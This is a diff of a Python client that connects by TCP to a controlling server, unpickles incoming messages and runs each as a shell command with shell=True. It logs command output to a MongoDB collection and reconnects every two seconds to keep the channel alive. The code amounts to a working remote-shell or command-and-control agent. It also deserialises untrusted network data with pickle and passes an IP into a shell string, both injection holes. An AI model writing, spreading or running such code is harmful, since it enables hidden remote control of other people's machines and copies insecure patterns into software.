@@ -4,53 +4,107 @@ import socket
 import pickle
 import pymongo
 import subprocess
+import time
+import threading
 
 
-myclient = pymongo.MongoClient("mongodb://localhost:27017/")
-mydb = myclient["test_h"]
-mycol = mydb["data"]
+conn = True
+
+def test_connection(ip):
+    while True:
+        time.sleep(2)
+        try:
+            ping_out = subprocess.check_output(f'ping -c 5 {ip}', shell=True)
+        except:
+            ping_out = subprocess.check_output(f"ping {ip}", shell=True)
+
+        if ping_out:
+            return True
+        else:
+            global conn
+            conn = False
+            return
+
+def start(ip=socket.gethostname(), port=50000, db_link="mongodb://localhost:27017/"):
+    """
+    pymongo used to create a link to the NOSQL database (mongodb)
+    socket used to create a tcp link with the server
+
+    The pickle module implements binary protocols for serializing and de-serializing a Python object structure.
+    “Pickling” is the process whereby a Python object hierarchy is converted into a byte stream
+
+    since client receives a stream of  small bytes = 5 bytes per sending
+    HEADERSIZE used to identify the int merged with space before msg to idetify the len of the msg
+    to be able to identify if the msg got full or not , to do the full msgs without error
+
+    subprocess is a library to deal with the operating system to implement and get any output
+    """
+    global conn
+    conn = True
+
+    while conn:
+        try:
+            myclient = pymongo.MongoClient(db_link)
+            mydb = myclient["test_h"]
+            mycol = mydb["data"]
+
+            HEADERSIZE = 100
+
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+        except:
+            break
+        connection = threading.Thread(target=test_connection, args=(ip,))
+        connection.daemon = True
+        connection.start()
+
+        count = 0
+        while conn:
+
+            full_msg = b''
+            new_msg = True
+            while True:
+                msg = s.recv(5)
+                count += 1
+                if len(msg) <= 0:
+                    break
+                if new_msg:
+                    msglen = int(msg[:HEADERSIZE])
+                    new_msg = False
+                full_msg += msg
+
+                if len(full_msg) - HEADERSIZE == msglen:
+                    print("full msg received")
+                    msg_got = pickle.loads(full_msg[HEADERSIZE:])
+
+                    try:
+                        do_command = subprocess.check_output(msg_got, shell=True)
+                        print(do_command.decode())
+                        try:
+                            if len(do_command.decode()) >= 1:
+                                to_db = mycol.insert_one({"data": f"{subprocess.check_output(msg_got, shell=True).decode()}", "code": 0})
+                            else:
+                                to_db = mycol.insert_one({"data": "command has no shown value", "code": 0})
+                        except:
+                            pass
+                    except:
+                        try:
+                            to_db = mycol.insert_one({"data": "failed command", "code": 0})
+                        except:
+                            pass
+                    print("number of packets got : ", count)
+                    count = 0
+                    break
+
+    return
 
 
-HEADERSIZE = 100
 
-ip = socket.gethostname()
-port = 55555
+# while loop used with time , as to handle the error of internet connections to try to run the function
+# every 2 seconds
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((ip, port))
-
-count = 0
 
 while True:
-	full_msg = b''
-	new_msg = True
-	while True:
-		msg = s.recv(5)
-		count += 1
-		if len(msg) <= 0:
-			break
-		if new_msg:
-			msglen = int(msg[:HEADERSIZE])
-			new_msg = False
-		full_msg += msg
-
-		if len(full_msg) - HEADERSIZE == msglen:
-			print("full msg received")
-			msg_got = pickle.loads(full_msg[HEADERSIZE:])
-			print("command got : ", msg_got)
-			# x = os.popen(msg_got).read()
-			# print(x)
-			try:
-				do_command = subprocess.check_output(msg_got, shell=True)
-				print(do_command)
-				if len(do_command.decode()) >= 1:
-					to_db = mycol.insert_one({"data": do_command.decode(), "code": 0})
-				else:
-					to_db = mycol.insert_one({"data": "command has no shown value", "code": 0})
-
-			except:
-				to_db = mycol.insert_one({"data": "failed command", "code": 0})
-
-			print("number of packets got : ", count)
-			count = 0
-			break
+    start()
+    print("error in connection")
+    time.sleep(2)
